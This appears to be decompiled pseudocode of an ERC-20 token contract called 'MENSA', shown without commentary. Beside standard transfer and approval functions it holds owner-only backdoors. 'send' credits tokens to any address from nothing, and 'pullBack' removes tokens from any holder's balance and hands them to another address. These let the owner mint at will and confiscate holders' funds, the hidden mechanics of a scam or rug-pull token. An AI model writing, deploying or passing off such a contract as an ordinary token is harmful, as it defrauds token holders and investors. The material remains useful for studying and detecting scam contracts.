contract main {




// =====================  Runtime code  =====================


const name = 'MENSA'

const decimals = 18

const symbol = 'MSA'

const INITIAL_SUPPLY = 8761815


address owner;
uint256 stor1;
mapping of uint256 showMyTokenBalance;
mapping of uint256 allowance;

function balanceOf(address arg1) {
    return showMyTokenBalance[address(arg1)]
}

function owner() {
    return owner
}

function showMyTokenBalance(address arg1) {
    return showMyTokenBalance[address(arg1)]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function totalSupply() {
    return (stor1 - showMyTokenBalance[0])
}

function approve(address arg1, uint256 arg2) {
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferOwnership(address arg1) {
    require msg.sender == owner
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function increaseApproval(address arg1, uint256 arg2) {
    require arg2 + allowance[msg.sender][address(arg1)] >= allowance[msg.sender][address(arg1)]
    allowance[msg.sender][address(arg1)] += arg2
    emit Approval((arg2 + allowance[msg.sender][address(arg1)]), msg.sender, arg1);
    return 1
}

function decreaseApproval(address arg1, uint256 arg2) {
    if arg2 <= allowance[msg.sender][address(arg1)]:
        allowance[msg.sender][address(arg1)] -= arg2
    else:
        allowance[msg.sender][address(arg1)] = 0
    emit Approval(allowance[msg.sender][address(arg1)], msg.sender, arg1);
    return 1
}

function send(address arg1, address arg2, uint256 arg3) {
    require msg.sender == owner
    require arg3 >= showMyTokenBalance[address(arg2)]
    require arg3 + showMyTokenBalance[address(arg1)] >= showMyTokenBalance[address(arg1)]
    showMyTokenBalance[address(arg1)] += arg3
    emit Transfer(arg3, arg2, arg1);
}

function transfer(address arg1, uint256 arg2) {
    require arg2 <= showMyTokenBalance[msg.sender]
    require arg2 <= showMyTokenBalance[msg.sender]
    showMyTokenBalance[msg.sender] -= arg2
    require arg2 + showMyTokenBalance[arg1] >= showMyTokenBalance[arg1]
    showMyTokenBalance[address(arg1)] = arg2 + showMyTokenBalance[arg1]
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function pullBack(address arg1, address arg2, uint256 arg3) {
    require msg.sender == owner
    require arg3 <= showMyTokenBalance[address(arg2)]
    require arg3 <= showMyTokenBalance[address(arg2)]
    showMyTokenBalance[address(arg2)] -= arg3
    require arg3 + showMyTokenBalance[arg1] >= showMyTokenBalance[arg1]
    showMyTokenBalance[address(arg1)] = arg3 + showMyTokenBalance[arg1]
    emit Transfer(arg3, arg2, arg1);
    require arg3 + stor1 >= stor1
    stor1 += arg3
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require arg2
    require arg3 <= showMyTokenBalance[address(arg1)]
    require arg3 <= allowance[address(arg1)][msg.sender]
    require arg3 <= showMyTokenBalance[address(arg1)]
    showMyTokenBalance[address(arg1)] -= arg3
    require arg3 + showMyTokenBalance[arg2] >= showMyTokenBalance[arg2]
    showMyTokenBalance[address(arg2)] = arg3 + showMyTokenBalance[arg2]
    require arg3 <= allowance[address(arg1)][msg.sender]
    allowance[address(arg1)][msg.sender] -= arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
